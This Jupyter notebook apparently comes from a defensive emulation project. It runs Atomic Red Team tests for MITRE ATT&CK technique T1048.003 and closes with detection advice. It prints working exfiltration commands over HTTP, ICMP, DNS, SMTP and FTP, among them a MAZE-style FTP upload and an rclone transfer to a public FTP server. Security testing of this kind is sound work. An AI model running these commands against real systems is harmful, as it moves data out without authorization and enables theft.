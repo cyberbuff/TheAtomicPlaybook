{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cd436de0",
   "metadata": {},
   "source": "# T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol\nAdversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. "
  },
  {
   "cell_type": "markdown",
   "id": "edf75686",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "dba0db15",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Exfiltration Over Alternative Protocol - HTTP",
    "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n",
    "**Supported Platforms:** macos, linux",
    "Run it with these steps!",
    "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2f59d47",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Exfiltration Over Alternative Protocol - ICMP",
    "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f655df41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "f90a9305",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Exfiltration Over Alternative Protocol - DNS",
    "Exfiltration of specified file over DNS protocol.\n",
    "**Supported Platforms:** linux",
    "Run it with these steps!",
    "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "96fa603f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Exfiltration Over Alternative Protocol - HTTP",
    "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$content = Get-Content C:\\Windows\\System32\\notepad.exe\nInvoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "beab9c3f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "c7986b0a",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Exfiltration Over Alternative Protocol - SMTP",
    "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSend-MailMessage -From test@corp.com -To test@corp.com -Subject \"T1048.003 Atomic Test\" -Attachments C:\\Windows\\System32\\notepad.exe -SmtpServer 127.0.0.1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f218b716",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "d0c955b3",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - MAZE FTP Upload",
    "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://127.0.0.1/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('None', 'None')\nif (test-connection -count 1 -computername \"127.0.0.1\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e512eab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "3b8beb50",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$ftp = \"ftp://127.0.0.1/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('None','None')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a18c24a1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "88809f82",
   "metadata": {},
   "source": "### Atomic Test #7 - Exfiltration Over Alternative Protocol - FTP - Rclone\nRclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Check if the exfil package exists\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nfsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n\n```\n##### Description: Check if rclone zip exists\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "62179768",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9e689bf9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" ftp.dlptest.com \"port\" 21 \"user\" dlpuser \"pass\" rNrKYTX9g7z3RgJRmxWuGHbeu\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b7c1100",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "361e1aeb",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Python3 http.server",
    "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e9c67080",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.003 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "b79b55d8",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) \n\nFor network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}